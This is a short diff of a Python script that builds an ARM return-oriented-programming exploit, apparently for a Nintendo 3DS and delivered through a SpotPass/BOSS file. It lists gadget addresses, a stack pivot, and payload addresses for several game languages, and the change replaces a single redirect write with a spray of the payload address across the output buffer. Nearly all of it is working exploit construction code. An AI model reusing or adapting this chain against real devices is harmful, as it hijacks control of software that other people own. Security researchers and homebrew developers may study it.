@@ -20,7 +20,7 @@ pivot_args=0x244e08  #ldm r0, {r0, r1} ; ldr r2, [r0] ; ldr r2, [r2, #0xc] ; blx
 pivot=0x12f6c0       #mov sp, r0 ; mov r0, r2 ; mov lr, r3 ; bx r1
 pivot_r3=0x1144e4
 
-PAYLOAD_ADDR=0x1579ed80		 	#1579d780-eng 1579dd80-fra 1579e780-esp 1579d780-por
+PAYLOAD_ADDR=0x1579ed80	 		#1579d780-eng 1579dd80-fra 1579e780-esp 1579d780-por
 								#1579d780 ropkit to pivot to, finishing stage0. ropkit is embedded in the spotpass file  (weird charactor name inside boss/
 POP_R1PC=0x00109d6c           
 POP_R0PC=0x0011a698
@@ -43,14 +43,14 @@ def addr_convert(addr):
 	print(hex(c))
 	return c
 	
-
-for i in range(0,size-1,4):
-	temp=d
-	out[i:i+4]=struct.pack("<I",temp)
+temp=addr_convert(PAYLOAD_ADDR)
+for i in range(0,size-0x80,0x80):
+	out[i:i+0x60]=struct.pack("<I",temp)*24
+	out[i+0x60:i+0x80]=struct.pack("<I",0)*8
 	
-write32(redirect_offs, addr_convert(PAYLOAD_ADDR))
+#write32(redirect_offs, addr_convert(PAYLOAD_ADDR))
 
-out[0x1bf70:0x1bf70+0x20]=b"\x00"*0x20
+#out[0x1bf60:0x1bf60+0x20]=b"\x00"*0x20
 
 webstrand=struct.pack("<IIIII", PAYLOAD_ADDR, pop_r4r7pc, pivot_args, pivot, pivot_r3)
 
